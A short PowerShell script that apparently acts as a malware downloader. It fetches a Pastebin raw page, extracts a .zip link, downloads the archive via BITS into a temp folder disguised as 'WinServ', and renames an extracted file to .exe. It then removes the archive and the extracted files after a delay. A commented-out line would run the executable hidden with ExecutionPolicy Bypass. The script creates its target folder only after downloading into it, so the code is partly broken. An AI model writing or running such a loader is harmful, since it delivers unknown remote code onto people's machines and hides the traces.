function Get-RawPastebinContent {
    param(
        [string]$PastebinRawUrl
    )

    $content = Invoke-RestMethod -Uri $PastebinRawUrl
    return $content
}

function Get-ZipUrlFromText {
    param(
        [string]$Text
    )

    $regex = '(?im)(http.*?\.zip)'
    $matches = [regex]::Matches($Text, $regex)
    foreach ($match in $matches) {
        return $match.Value
    }
}

$pastebinRawUrl = "https://pastebin.com/raw/S9B5GjSJ"
$pastebinContent = Get-RawPastebinContent -PastebinRawUrl $pastebinRawUrl

$zipUrl = Get-ZipUrlFromText -Text $pastebinContent

$tempPath = [System.IO.Path]::GetTempPath()
$appFolder = Join-Path -Path $tempPath -ChildPath "WinServ"

$zipPath = Join-Path -Path $appFolder -ChildPath "Service.zip"
$extractedPath = Join-Path -Path $appFolder -ChildPath "Win"

Start-BitsTransfer -Source $zipUrl -Destination $zipPath

New-Item -Path $appFolder -ItemType Directory -Force

Expand-Archive -Path $zipPath -DestinationPath $extractedPath -Force
Rename-Item -Path "$extractedPath\ud8wua82" -NewName "ud8wua82.exe"
$exePath = Join-Path -Path $extractedPath -ChildPath "ud8wua82.exe"

#Start-Process -FilePath $exePath -ArgumentList "-NoProfile" -ExecutionPolicy Bypass -WindowStyle Hidden
Remove-Item -Path $zipPath

Start-Sleep -Seconds 300

Remove-Item -Path $extractedPath -Recurse
